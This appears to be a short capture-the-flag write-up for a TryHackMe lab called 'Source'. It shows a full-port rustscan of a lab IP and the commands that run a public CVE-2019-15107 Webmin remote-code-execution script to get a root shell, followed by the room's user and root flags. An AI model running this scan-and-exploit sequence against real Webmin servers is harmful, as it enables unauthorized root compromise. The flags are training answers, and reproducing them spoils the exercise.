# Source - Easy

```shell
rustscan -a 10.10.108.49 --range 0-65535 --ulimit 5000 -- -sV

#download webmin exploit from github
python3 CVE-2019-15107.py --help

python3 CVE-2019-15107.py -p 10000 10.10.108.49
#we get shell as root
#get user and root flag
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 10000 - http - MiniServ 1.890 (Webmin httpd)

We can check the website on port 10000, but it gives the following error:

    Error - Document follows
    This webs server is running in SSL mode. Try the URL <url> instead

So we will have to try another way in.

On searching for 'miniserv 1.890 exploit', we get a lot of search results.

I used Muirland Oracle's Python implementation, which is a Webmin RCE exploit.

We can run it with the correct switches and we will get shell as root.

user flag can be found in /home/dark/user.txt
root flag can be found in /root/root.txt
```

1. user.txt - THM{SUPPLY_CHAIN_COMPROMISE}

2. root.txt - THM{UPDATE_YOUR_INSTALL}
